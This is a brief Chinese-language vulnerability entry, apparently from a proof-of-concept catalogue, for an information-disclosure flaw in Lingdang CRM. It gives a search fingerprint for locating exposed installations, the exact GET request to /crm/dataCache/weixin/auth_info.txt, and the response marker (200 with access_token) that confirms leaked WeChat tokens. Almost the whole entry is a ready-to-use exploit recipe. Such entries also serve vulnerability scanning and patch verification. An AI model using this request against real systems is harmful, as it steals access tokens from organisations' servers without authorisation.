# 灵当CRM客户管理系统auth-info信息泄露漏洞

灵当CRM客户管理系统auth-info ｜ 信息泄露 ｜ —
- **指纹**：`body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
- **请求**：`GET /crm/dataCache/weixin/auth_info.txt HTTP/1.1`
- **响应特征**：200 access_token